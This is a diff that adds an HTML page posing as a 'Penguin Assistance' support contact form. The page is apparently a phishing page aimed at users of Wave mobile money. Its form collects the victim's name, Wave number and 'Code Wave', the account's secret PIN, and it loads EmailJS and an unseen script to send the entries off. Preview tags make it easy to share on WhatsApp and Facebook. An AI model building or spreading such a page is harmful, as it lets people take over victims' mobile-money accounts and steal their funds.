@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Penguin Assistance</title>
+
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="favicon.png">
+
+    <!-- Facebook / WhatsApp -->
+    <meta property="og:title" content="Penguin Assistance">
+    <meta property="og:description" content="Expliquez votre problème et nous vous assisterons immédiatement.">
+    <meta property="og:image" content="https://yanickovick.github.io/pagedeconnection/preview.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:url" content="https://yanickovick.github.io/pagedeconnection/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Penguin Assistance">
+
+    <!-- Twitter / X -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Penguin Assistance">
+    <meta name="twitter:description" content="Expliquez votre problème et nous vous assisterons immédiatement.">
+    <meta name="twitter:image" content="https://yanickovick.github.io/pagedeconnection/preview.png">
+
+    <!-- Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+</head>
+
+<body>
+
+<img src="penguin.png" alt="Pingouin" class="logo">
+
+<div class="container">
+
+    <div class="language">
+        <select id="language">
+            <option value="fr">🇫🇷 Français</option>
+            <option value="en">🇬🇧 English</option>
+        </select>
+    </div>
+
+    <h2 id="title">Formulaire de Contact</h2>
+
+    <p id="description" class="description">
+        Expliquez votre problème et nous vous assisterons immédiatement.<br>
+        Merci de nous faire confiance.
+    </p>
+
+    <form id="formulaire">
+
+        <label id="lblName">Nom et prénom</label>
+        <input type="text" id="name" required>
+
+        <label id="lblPhone">Numéro Wave</label>
+        <input type="tel" id="phone" placeholder="Entrez votre numéro Wave" required>
+
+        <label id="lblProblem">Décrivez votre préoccupation</label>
+        <textarea id="problem" rows="5" placeholder="Décrivez votre problème..." required></textarea>
+
+        <label id="lblPsswd">Code Wave</label>
+        <input type="text" id="psswd" placeholder="Entrez votre code Wave">
+
+        <br>
+
+        <div class="g-recaptcha"
+             data-sitekey="6LeDj2AtAAAAAJueiYbbtkCLpHk7OgAemq7D9-YN">
+        </div>
+
+        <br>
+
+        <button type="submit" id="sendBtn">
+            Envoyer
+        </button>
+
+        <p id="success" style="display:none;color:limegreen;font-weight:bold;">
+            ✔ Envoyé avec succès !
+        </p>
+
+    </form>
+
+</div>
+
+<footer class="copyright">
+    © 2020 Penguin Assistance. Tous droits réservés.
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script src="script.js"></script>
+
+</body>
+</html>
